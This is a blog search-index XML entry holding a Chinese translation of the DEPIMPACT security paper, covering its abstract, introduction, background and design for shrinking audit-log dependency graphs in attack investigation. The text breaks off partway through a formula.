<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>paper_day1_DEPIMPACT</title>
      <link href="/2022/11/16/paper-day1-DEPIMPACT/"/>
      <url>/2022/11/16/paper-day1-DEPIMPACT/</url>
      
        <content type="html"><![CDATA[<h1 id="对攻击调查的反向传播系统依赖性影响">对攻击调查的反向传播系统依赖性影响</h1><blockquote><p>本文来自：https://www.usenix.org/conference/usenixsecurity22/presentation/fang</p><p>翻译paper:https://www.usenix.org/system/files/sec22summer_fang.pdf</p></blockquote><h2 id="摘要">摘要</h2><p>系统审计数据的因果分析已经成为了攻击调查的重要解决方法。给定一个POI(Point-Of-Interest,兴趣点)事件（例如，对一个可疑文件创建产生告警），因果分析构建了一个依赖关系图来揭示攻击顺序，其中节点表示系统实体（例如，进程和文件），边表示实体之间的依赖关系。但是，因果分析通常会产生一个巨大的图（大于100000条边），安全分析师很难检查。从各种攻击的依赖关系图中，我们发现：(1)与POI事件高度相关的依赖关系通常表现出与不大相关的依赖关系不同的的一组属性（例如数据流和时间）(2) POI事件通常与一些攻击实体有关（例如，下载文件）。基于上述观察，我们提出了DEPIMPACT，一个通过(1)为边分配歧视性以来权重，以此来区分表示攻击序列关键边和不那么重要的依赖关系。(2)从POI事件向后传播依赖影响到入口点(3)依据它们的依赖影响从排名靠前的入口节点向前进行因果分析，以此过滤掉在向前因果分析中没有被找到的边。来识别依赖图（即子图）关键组成部分的框架。我们通过1.5亿条真实攻击的真实系统审计事件和DARPATC数据集评估表明，DEPIMPACT可以将很大的依赖关系图(大概1,000,000条边)缩减成一个小图(大概234条边)，缩小了4611倍。与其他最新的因果分析技术比较表明，在保留攻击序列的同时，DEPIMPACT在缩减依赖图上提升了106倍有效性。</p><h2 id="介绍">介绍</h2><p>近期的网络攻击已经困扰了很多防护良好的企业，并造成了重大的经济损失。这些攻击经常利用多种类型的漏洞在多个阶段渗透进目标系统，给检测和调查带来挑战。为了应对这些攻击，基于<em>无处不在的系统监控</em>的最新的方法已经成为了监视系统活动和执行攻击调查的重要方法。系统监视收集有关系统调用的内核审计事件作为系统审核日志。收集的数据使基于因果关系的方法能够识别入侵的入口点（向后追踪）和攻击的分支（向前追踪），这已经被证明可有效减少入侵的误报并协助即时的系统恢复。</p><p>尽管因果关系分析有很大的前景，但是现有的方法需要不菲的努力来检查，这限制了它们的广泛采用。因果分析方法假设在同一系统调用事件（例如，进程读取文件）中涉及的系统实体（例如，文件、进程、网络连接）之间的因果关系。基于这样的假设，这些方法在系统依赖图中组织系统调用事件，节点是系统实体，边是系统事件。通过检查这样一个依赖图，安全分析师可以通过重新构建导致POI（兴趣点）事件（也就是异常检测工具或者手动观察的告警事件）的事件链来获得攻击的上下文信息。这样的上下文信息在区分良性和攻击相关的事件方面特别有效。然而，由于依赖爆炸的问题。依赖关系图可能是巨大的，通常包括超过100,000条边。结果，安全分析师很难对这图进行合理的推理并找到对攻击至关重要的边。</p><p><strong>重要发现</strong>通过仔细检查各种攻击的依赖关系图，我们有两个关键的观察结果。首先，在由POI事件构成的大型依赖关系图中，表示攻击序列的少量的关键边（例如，创建和执行恶意payload的事件）通常被掩藏在许多非关键边（例如，执行不相关的系统活动的事件中）。与非关键边相比，关键边通常表现出不同的属性集，并且更可能与这些属性中的POI事件相关。例如，从一个可疑的IP读取数据，然后写数据到一个可疑的脚本文件的关键边将具有与与脚本文件大小相似的数据流量。其次，一个POI事件通常是由少数源头引起的，称之为攻击条目。这些攻击条目被表示为导致POI事件的攻击序列的入口点，并且被埋藏在许多不相关的入口节点（即节点没有入度）中。例如，许多攻击都是从向受害主机注入恶意脚本开始的并可能在攻击过程中进一步下载更多工具。这种攻击被捕获在依赖关系图中，攻击条目代表下载的恶意脚本和工具。</p><p><strong>挑战</strong>虽然识别关键和攻击条目在减少依赖图大小的同时保留攻击序列方面有巨大潜力，但实现这些目标存在三个主要的挑战。</p><p>首先，与POI事件有因果关系的进程通常在后台执行其他不相关的系统活动，导致依赖关系图中包含大量不太重要的依赖关系。此外，这些不相关的系统活动通常可以追溯到对POI事件影响很小的许多不相关的来源（例如，不相关的网页浏览和文件下载），因此因果分析可能回识别出超过一千多个入口节点(第5.1节)。因此，手动检查这些数据量惊人的边和入口节点来识别关键边和关键攻击入口是不可行的。</p><p>其次，数据流量似乎是区分某些攻击中关键边有希望的特征。然而，根据我们的经验观察（第5.1节），对许多攻击，通常有许多非关键边具有与依赖关系图的关键边相似的数据量。这表明单个特征在解决多样性的攻击场景方面受到限制。</p><p>最后，虽然现有技术也尝试识别关键边缘，但它们主要依赖于导致信息丢失的启发式规则、侵入性系统变化，如二进制工具和内核定制，或执行配置文件，阻碍了它们的实际采用。例如，PrioTracker将具有许多依赖关系的进程分配较低的优先级，来关注在更小的范围上的调查（即，具有较少依赖关系的进程）。但是这种策略会错过利用易受攻击的复杂软件（例如，网页浏览器），这些软件有许多的依赖关系（例如，读取/写入一些文件并与其他进程交互）。现有技术采取的另一个常见组成是使用执行配置文件来检测异常事件。然而，对大型企业来说，正在运行的实例数目巨大，它们具有非常多样化的行为。获得这些实例的通用执行配置文件几乎是不可能的。因此，强烈需要一种不受相同采用限制的通用解决方案。</p><p><strong>贡献。</strong>基于重要的观察，我们提出了DEPIMPACT，一个通过识别大依赖关系图中关键边和攻击条目来促进攻击调查的新颖的框架。具体来说，给定要调查的POI事件，DEPIMPACT首先采用因果分析构建一个POI事件的回溯依赖关系图，然后采用自动化技术来识别依赖关系图中的关键组成部分。关键组成部分是一个保留了对攻击调查至关重要的信息(即关键边和攻击条目)的依赖关系子图。由于它保留了攻击信息，并且其大小与原始依赖关系图相比大大减小，因此大大减少了揭示攻击步骤的复杂性，从而促进了攻击调查。DEPIMPACT开发了三种主要的技术来解决上述的技术挑战。</p><p>(1)<strong>依赖权重计算：</strong>不像依赖于执行配置文件或单个特征，DEPIMPACT通过分析每条边的多个特征来捕获了关键边和非关键边之间的差异，包括事件、数据流量和节点的度(第4.2.2节)。然后，DEPIMPACT采用了基于线性分析(LDA,LinearDiscriminantAnalysis)的判别特征投影方案，计算基于这些特征的权重分，成为依赖权重（第4.2.3节）。该方案旨在最大化关键边和非关键边之间的权值差异。不是像已有的工作一样使用全局权重，DEPIMPACT将将输出边的权值规范化，因此最终的权值是每一个节点的局部权值。这解决了使用全局权值的局限性：与来自相同源的其他边相比，某些关键边可能很重要，但是当它们远离POI事件时，它们可能会收到非常低的全局权值。具有较高的依赖权重（范围从0.0到1.0）的边表示与POI事件的相关性更高，并且更有可能是关键边。</p><p>(2)<strong>依赖影响反向传播和入口节点排名：</strong>为了揭示攻击条目，DEPIMPACT采用了依赖影响的概念。节点的依赖影响被定义节点对POI事件的影响进行建模的评分，即较高的评分意味着更高的影响。为了计算所有节点的依赖影响，DEPIMPACT采用了加权分数传播方案，该方案将依赖影响从POI事件种的节点沿着边向后传播到所有入口节点。收到TrustRank的启发，我们的分数传播方案将节点的依赖影响计算作为其子节点的依赖影响分数的加权和，其中每个子节点的权重是父节点和子节点之间边的归一化依赖权重，我们的分数传播方案背后的观察是，攻击条目对POI事件的影响依据边的依赖权重按比例分配给其子对象。传播后，DEPIMPACT根据入口节点的依赖影响对其进行排名，排名靠前的入口节点更可能是攻击条目。</p><p>(3)<strong>用于关键组成部分识别的向前因果分析：</strong>在对入口节点进行排名之后，DEPIMPACT从排名靠前的入口节点向前进行因果分析，产生另一个依赖关系图，称为前向依赖关系图。前向图和原始后向依赖图之间重叠的部分准确保留了与POI事件和攻击条目高度相关的节点和边，我们将此重叠部分称为原始依赖关系图的关键组成部分。</p><p><strong>评估</strong>我们在大约2w行代码中实现了DEPIMPACT的原型，并且将其部署在物理测试环境上进行评估。我们基于CyberKillChain框架和CVE进行了7次攻击，这些攻击在先前的研究中使用和3次多主机入侵攻击，并应用DEPIMPACT来调查。在我们的评估过程中，已部署的主机继续恢复它们的常规任务，以模拟不相关的系统活动和攻击活动并存的真实部署。在我们的评估中，我们还在DARPATC数据集中包括了5个攻击案例。总的来说，我们对执行的攻击收集了1亿个系统审计事件，并且DARPATC数据集包括大约50000万个事件。我们的攻击和数据集可以在<a href="https://github.com/usenixsub/DepImpact">项目网站</a>上获得。</p><p>评估结果表明，DEPIMPACT在揭示关键边和攻击条目方面非常有效。平均而言，DEPIMPACT产生的关键组成部分的大小大约有234条边，比原始依赖关系图的大小（大约100万条边）小大约4611倍。如此高的降低率是在不遗漏任何关键边缘的情况下实现的，这主要是由于DEPIMPACT始终将攻击条目放在首位。与其他四种最先进的因果关系分析技术（CPR,ReadOnly,PrioTracker和NoDoze）的比较表明，DEPIMPACT在依赖图中至少有效72倍，并且不会错过在比较技术中的关键边。此外，与使用较少特征的DEPIMPACT版本和使用平均投影向量来计算依赖影响的平均投影方法相比，DEPIMPACT在对攻击条目进行排名时至少实现了69.91%改进，证明了DEPIMPACT的歧视性特征投影方案的优越性，并证明了特征的必要性。最终，DEOUNOACT在6分钟完成了攻击分析，与平均投影相比，攻击速度快了4倍。结果还表明，对大多数攻击，DEPIMPACT和NoDoze具有相似的运行时性能，但是DEPIMPACT的降低率要比NoDoze好得多。</p><h2 id="背景和动机">2.背景和动机</h2><h3 id="系统监控">2.1 系统监控</h3><p>系统监控收集在安全性分析中至关重要的有关系统调用的审计事件，描述了系统实体之间的交互。如先前的研究所示，在主流操作系统(Windows、Linux和Mac OS)上，大多数情况下的系统实体是文件、进程和网络连接，并且收集的系统调用映射到三种主要类型的系统事件:(1)文件访问,(2)进程创建和销毁，以及(3)网络访问。遵循既定趋势，在这项工作中，我们<em>将系统实体看作文件，进程和网络连接</em>。我们将系统事件视为两个系统实体之间的交互，表示为<em>&lt;主体，操作,客体&gt;</em>。主体是源自软件应用程序 (例如，Chrome)的进程，客体可以是文件、进程和网络连接。我们根据系统事件的客体实体类型将其分为三种类型，即<em>文件事件、进程事件和网络事件</em>。实体和事件都具有与关键安全相关的属性(表1和表2)。</p><p><img src="image-20221114213846350.png"></p><p>实体的代表性属性包括文件名、进程可执行名称、IP和端口。事件的代表性属性包括事件起源(例如，开始时间/结束时间) 和操作 (例如，文件读/写)。</p><h3 id="因果关系分析">2.2 因果关系分析</h3><p>因果关系分析分析审计事件以推断其依赖关系，并将依赖关系呈现为有向图。在依赖图G(E,V)中，节点 v∈V 表示进程、文件或网络连接。边e(u,v) ∈ E表示涉及两个实体u和v(例如，进程创建，文件读取或写入以及网络访问) 的系统审计事件，并且其方向(从源节点u到目的节点v) 表示数据流的方向。每个边都与时间窗口tw(e)相关联。我们用ts(e)和te(e)来表示时间e的开始时间和结束时间。形式上，在依赖图中，对于两个事件e<sub>1</sub>(u<sub>1</sub>，v<sub>1</sub>)和e<sub>2</sub>(u<sub>2</sub>，v<sub>2</sub>)，如果v<sub>1</sub>= u<sub>2</sub>且ts(e<sub>1</sub>)&lt;te(e<sub>2</sub>)，则e1和e2之间存在因果依赖关系。</p><p>因果关系分析可以实现两个重要的安全应用:(1)向后因果关系分析，确定攻击的入口点;(2)向前因果关系分析，调查攻击的后果。给定POI事件e<sub>s</sub>(u，v)，向后因果分析从源节点u回溯以找到对u具有因果依赖关系的所有事件，而向前因果分析从目的节点v向前追溯以找到v有因果依赖关系的所有事件。</p><h3 id="情景样例">2.3 情景样例</h3><p><img src="image-20221114214100290.png"></p><blockquote><p>图1：下载恶意文件并通过重命名来隐藏文件的一次攻击的部分依赖关系图(进程为矩形，文件为椭圆形，网络连接为平行四边形)。通过向后因果分析从POI事件(重命名为user/file.txt)构建的完整依赖关系图包含194,208节点和3,273,769边。DEPIMPACT识别的关键组成部分用深黑色标记，其中包含10个节点(包括2个攻击条目) 和12个边(这些边都是关键边)。可以看出，DEPIMPACT在保留关键攻击信息的同时显著减小了依赖关系图的大小。</p></blockquote><p>图1显示了文件隐藏活动的部分依赖关系图:执行可疑脚本<strong>mal.sh</strong>来从远程主机<strong>192.1.1.254</strong>下载恶意文件<strong>mal</strong>。然后将文件移动到<strong>user/mal</strong>并重命名为<strong>user/file.txt</strong>。给定将文件重命名为<strong>user/file.txt</strong>的POI事件，由向后因果分析产生的依赖关系图包含194,208节点和3,273,769条边。代表攻击序列的关键边和攻击条目(<strong>192.1.1.254，mal.sh</strong>)标为深黑色。攻击调查的目标是检查依赖关系图，来揭示攻击的关键边和攻击条目。</p><p><strong>挑战</strong> 如图1所示，攻击调查是在大海捞针的过程:有限数量的关键边缘(12个)被埋藏在大量(约300万个)非关键边(即，较不重要的依赖关系)，攻击条目(大约35k个不相关条目节点中的2个)也是如此。当应用现有技术(例如PrioTracker和NoDoze)来识别这些关键边时，它们的性能较差。PrioTracker依赖于节点的扇出值来确定边的优先级。由于<strong>bash</strong>进程具有高扇出值并且关键边与之相连，因此PrioTracker需要更高的阈值来保持关键边，从而产生具有114,614边的依赖关系图。NoDoze依赖于执行配置文件来过滤不相关的事件。但是，由于计算机系统的复杂性，几乎不可能获得涵盖大多数常见系统行为的执行配置文件。具体来说，不相关的进程<strong>grep</strong>引入了许多边，在训练执行配置文件时，这些边并不经常被观察到。这种罕见的良性事件导致NoDoze产生具有37,251条边的依赖关系图。</p><p><strong>使用DEPIMPACT识别关键组成部分</strong>DEPIMPACT首先将入口节点分为3类(即网络连接、文件和进程)，并对每个类别中的入口节点进行排序。在这里，DEPIMPACT将用于<strong>mal</strong>下载的<strong>IP192.1.1.254</strong>排为第1，恶意脚本<strong>mal.sh</strong>和可执行文件<strong>/bin/mv</strong>列为第1和第2。通过从排名靠前的入口节点执行前向因果关系分析并获取重叠，DEPIMPACT过滤掉了最不重要的依赖关系（大约300万）并识别出保留了所有关键边和攻击条目的关键组成部分（深黑色标记；10个节点，12条边）。注意PrioTracker的图比DEPIMPACT的大大约141倍，NoDoze的图比DEPIMPACT的大大约46倍。</p><h2 id="总结">3 总结</h2><p><img src="image-20221114223146282.png"></p><p>图2展示了DEPIMPACT的体系结构。给定一个POI事件，DEPIMPACT自动识别因果分析产生的依赖图的关键组成部分。DEPIMPACT包括三个阶段：(1)依赖图生成、(2)依赖权重计算和(3)关键组成识别。</p><p>在第一阶段，DEPIMPACT利用成熟的系统审计框架来收集系统审计日志。给定一个POI事件，DEPIMPACT解析收集到的日志并执行向后因果分析来生成POI事件的向后依赖关系图。在第二阶段中，DEPIMPACT首先使用了最先进的依赖关系图缩减技术来减小图的大小（第4.2.1节）。然后，DEPIMPACT提取边的特征，采用基于LDA的判别特征投影方案计算特征的依赖权值，从而更好地揭示关键边。第二阶段的输出是POI事件的加权依赖图。在第三阶段中，DEPIMPACT首先采用加权分数传播方案，将依赖影响从POI事件沿边向后传播到所有入口节点。然后，DEPIMPACT根据入口节点的依赖影响对入口节点进行排序，并选择最重要的候选节点。最后，DEPIMPACT对排名最高的入口节点进行前向因果关系分析，并将后向依赖图和前向依赖图的重叠部分作为输出的关键组成部分。</p><p><strong>威胁模型</strong>我们的威胁模型类似于之前的系统监控工作中的威胁模型。我们假设内核和内核层审计框架是我们的可信计算基础（TCB）的一部分，现有的软件和内核强化技术可以用于保护日志存储的安全。任何故意损害安全审计系统的内核级攻击都超出了本工作的范围。我们假设外部攻击者(从系统外部）远程攻击系统。因此，攻击者要么利用系统中的漏洞，要么说服用户下载带有恶意负载的文件。</p><p>我们不考虑使用隐式流 (例如，侧通道) 或进程间通信 (IPC)执行的攻击，这些攻击不经过内核层审查，因此无法被基础溯源采集工具捕获。可以使用捕获内存跟踪或程序分析技术的细粒度的审计工具来解决这些类型的攻击，这不是这项工作的重点。我们也不考虑模仿攻击，即攻击者故意通过一系列在企业中看似良性的事件来逃避入侵检测系统。现有的入侵检测系统通常依赖于基于单个事件属性的启发式或分析，因此容易受到此类攻击。虽然检测模仿攻击是检测系统的局限性，但它超出了这项工作的范围，因为我们的重点是将相关事件识别为检测系统生成的告警的上下文信息。</p><h2 id="depimpact的设计">4 DEPIMPACT的设计</h2><p>在本节中，我们将介绍图2所示的每个阶段的设计细节。具体地，第4.1节描述DEPIMPACT如何收集系统审计日志并生成依赖关系图，第4.2节描述DEPIMPACT如何计算依赖关系图中的每个边的权重来生成加权的依赖关系图，以及第4.3节描述DEPIMPACT如何基于加权的依赖关系图识别关键组成部分。</p><h3 id="依赖图生成">4.1 依赖图生成</h3><p>在第一阶段，DEPIMPACT利用系统监视来收集系统活动的审计日志，并对收集的日志应用因果关系分析以基于给定的POI事件生成依赖关系图。</p><h4 id="系统审计">4.1.1 系统审计</h4><p>DEPIMPACT利用成熟的系统审计框架来从内核收集有关系统调用的系统审计日志。 DEPIMPACT然后解析收集的日志以构建全局系统依赖关系图，其中节点代表系统实体，边代表系统（调用）事件。特别地，DEPIMPACT专注于三种类型的系统实体/事件：(i) 文件访问，(ii) 进程创建和销毁，以及(iii) 网络访问。表 3 显示了 DEPIMPACT 处理的（在 Linux中）具有代表性的系统调用。失败的系统调用会被 DEPIMPACT过滤掉，因为处理它们会导致事件之间出现错误的依赖关系。表 1 和表 2 显示了DEPIMPACT提取的实体和事件具有代表性的属性。继现有工作之后，为了唯一标识实体，对于进程实体，我们使用进程名称和PID作为其唯一标识符。对于文件实体，我们使用绝对路径作为其唯一标识符。对于网络连接实体，我们使用5 元组 &lt;srcip、srcport、dstip、dstport、protocol&gt;作为网络连接的唯一标识。在将事件与实体关联并跟踪事件之间的依赖关系时无法区分不同实体会导致问题。</p><p><img src="image-20221114231512828.png"></p><h4 id="向后因果分析">4.1.2 向后因果分析</h4><p>给定POI事件，DEPIMPACT向后因果关系分析(第2.2节)生成用于POI事件的局部向后依赖关系图G<sub>d</sub>。简而言之，向后因果分析将POI事件添加到队列中，并重复寻找队列中边/事件的合格传入边(即，边的源节点的传入边)直到队列为空的过程。阶段I的输出是一个向后依赖关系图，它只包含系统事件(和关联实体)，并且因果依赖于POI事件。</p><h3 id="依赖权重计算">4.2 依赖权重计算</h3><p>在II阶段，DEPIMPACT首先在依赖图中合并两个节点之间的平行边，并使用三种类型的特征(包括时序，数据流量和节点度)来计算边的权重。基于这些特征，DEPIMPACT将边聚类为两组，并利用LDA来计算权重分数，使这两组中边的权重差异最大化。权重计算的最后一步是归一化每个节点的所有传出边的权重。此步骤减轻了远离POI事件的边的权重下降。</p><h4 id="合并边">4.2.1 合并边</h4><p>因果分析产生的依赖关系图往往在两个节点之间有许多平行的边。原因是操作系统通常通过将数据按比例分配给多个系统调用来完成读/写任务(例如，文件读/写)。受依赖关系图缩减的最新工作的启发，如果两个节点之间的边的时间差小于给定的阈值，DEPIMPACT将合并这些边。我们为合并阈值尝试了不同的值，并选择了10s，因为它在合并文件操作，文件传输和网络通信的系统调用中给出了合理的结果，这与<em>Highfidelity data reduction for big data security dependencyanalyses</em>一致。</p><h4 id="特征提取">4.2.2 特征提取</h4><p>对于每个边，DEPIMPACT提取三个特征来计算依赖权重，使DEPIMPACT能够解决无法使用单个特征(例如，数据流) 来区分关键边的情况。</p><p><strong>数据流相关性f<sub>S(e)</sub></strong> 直观上，和POI事件中实体的数据大小相似的数据流量的边更有可能是相关的。因此，我们设计特征f<sub>D(e)</sub> 来模拟边 e(u,v) 与 POI 事件的数据流相关性： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.196ex;" xmlns="http://www.w3.org/2000/svg" width="24.112ex" height="5.232ex" role="img" focusable="false" viewBox="0 -1342 10657.4 2312.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="TeXAtom" transform="translate(523,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D446" d="M308 24Q367 24 416 76T466 197Q466 260 414 284Q308 311 278 321T236 341Q176 383 176 462Q176 523 208 573T273 648Q302 673 343 688T407 704H418H425Q521 704 564 640Q565 640 577 653T603 682T623 704Q624 704 627 704T632 705Q645 705 645 698T617 577T585 459T569 456Q549 456 549 465Q549 471 550 475Q550 478 551 494T553 520Q553 554 544 579T526 616T501 641Q465 662 419 662Q362 662 313 616T263 510Q263 480 278 458T319 427Q323 425 389 408T456 390Q490 379 522 342T554 242Q554 216 546 186Q541 164 528 137T492 78T426 18T332 -20Q320 -22 298 -22Q199 -22 144 33L134 44L106 13Q83 -14 78 -18T65 -22Q52 -22 52 -14Q52 -11 110 221Q112 227 130 227H143Q149 221 149 216Q149 214 148 207T144 186T142 153Q144 114 160 87T203 47T255 29T308 24Z"></path></g><g data-mml-node="mo" transform="translate(645,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1034,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(1500,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2186.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(3242.3,0)"><g data-mml-node="mn" transform="translate(2818.6,676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mrow" transform="translate(220,-709.5)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(278,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(502,-150) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g></g><g data-mml-node="mo" transform="translate(1381.7,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msub" transform="translate(2382,0)"><g data-mml-node="mi"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(502,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(499,-150) scale(0.707)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g></g></g></g><g data-mml-node="mo" transform="translate(3556.7,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(4056.9,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(5057.1,0)"><path data-c="1D6FC" d="M34 156Q34 270 120 356T309 442Q379 442 421 402T478 304Q484 275 485 237V208Q534 282 560 374Q564 388 566 390T582 393Q603 393 603 385Q603 376 594 346T558 261T497 161L486 147L487 123Q489 67 495 47T514 26Q528 28 540 37T557 60Q559 67 562 68T577 70Q597 70 597 62Q597 56 591 43Q579 19 556 5T512 -10H505Q438 -10 414 62L411 69L400 61Q390 53 370 41T325 18T267 -2T203 -11Q124 -11 79 39T34 156ZM208 26Q257 26 306 47T379 90L403 112Q401 255 396 290Q382 405 304 405Q235 405 183 332Q156 292 139 224T121 120Q121 71 146 49T208 26Z"></path></g></g><rect width="5897.1" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(9379.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(9768.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(10268.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span>其中s<sub>e</sub>和s<sub>e<sub>s</sub></sub>表示与边e和POI事件e<sub>s</sub>相关联的数据流量。|s<sub>e</sub>-s<sub>e<sub>s</sub></sub> |差异越小，数据流相关性f<sub>S(e)</sub>越高。注意，当e是POI事件时，我们使用一个小的正数α(我们设置α = 1e−4) 来处理特殊情况:POI事件具有最高的特征值f<sub>S(e<sub>s</sub>)</sub> = 